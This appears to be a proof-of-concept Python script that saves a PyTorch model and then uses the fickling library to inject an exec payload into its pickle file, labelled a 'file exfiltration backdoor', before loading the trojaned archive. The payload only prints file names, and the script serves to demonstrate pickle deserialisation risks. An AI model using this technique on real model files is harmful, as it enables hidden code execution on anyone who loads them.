"""
Tested with python3.9
This is tutorial code for generating, saving, and loading models in Pytorch
https://pytorch.org/tutorials/beginner/saving_loading_models.html
"""

from torch import nn, optim
import torch.nn.functional as F
import torch
from fickling import pickle
import zipfile
import shutil


# Define model
class TheModelClass(nn.Module):
    def __init__(self):
        super(TheModelClass, self).__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 13, 5)
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 16 * 5 * 5)
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x


# Initialize model
model = TheModelClass()

# Initialize optimizer
optimizer = optim.SGD(model.parameters(), lr=0.001, momentum=0.9)

print("=" * 30)
print("Creating and saving original model")
# Print model's state_dict
print("Model's state_dict:")
for param_tensor in model.state_dict():
    print(param_tensor, "\t", model.state_dict()[param_tensor].size())

# Print optimizer's state_dict
print("Optimizer's state_dict:")
for var_name in optimizer.state_dict():
    print(var_name, "\t", optimizer.state_dict()[var_name])

# NOTE This does not throw an error/check if a file exists already.
torch.save(model, "poc.zip")
shutil.unpack_archive("poc.zip", "/tmp/test_data", "zip")
pickle_file_path = "/tmp/test_data/archive/data.pkl"
pickled_file = open(pickle_file_path, "rb")
# Note, I had some weirdness with multiline strings, but this works okay
PAYLOAD = """exec("import os \nfor file in os.listdir(): \n\tprint(f'Exfiltrating {file}')")"""
try:
    pickled = pickle.Pickled.load(pickled_file)
    print("=" * 30)
    print("Inserting file exfiltration backdoor into serialized model")

    pickled.insert_python_exec(
        PAYLOAD,
        run_first=True,
        use_output_as_unpickle_result=False
    )
    # Open up the file for writing
    pickled_file.close()
    pickled_file = open(pickle_file_path, "wb")
    try:
        pickled.dump(pickled_file)
        # print("Dumped!")
        pickled_file.close()
        # Repack archive
        shutil.make_archive("test_poc", "zip", "/tmp/test_data", "archive")
        print("Loading trojan archive!")
        print("=" * 30)
        new_model = torch.load("test_poc.zip")
        new_model.eval()
        optimizer = optim.SGD(new_model.parameters(), lr=0.001, momentum=0.9)
        # Print model's state_dict
        print("Model's state_dict:")
        for param_tensor in new_model.state_dict():
            print(param_tensor, "\t", new_model.state_dict()[param_tensor].size())

        # Print optimizer's state_dict
        print("Optimizer's state_dict:")
        for var_name in optimizer.state_dict():
            print(var_name, "\t", optimizer.state_dict()[var_name])

    except Exception as e:
        print("Error writing pickled file! ", e)

except Exception as e:
    print("Error loading pickled file! ", e)
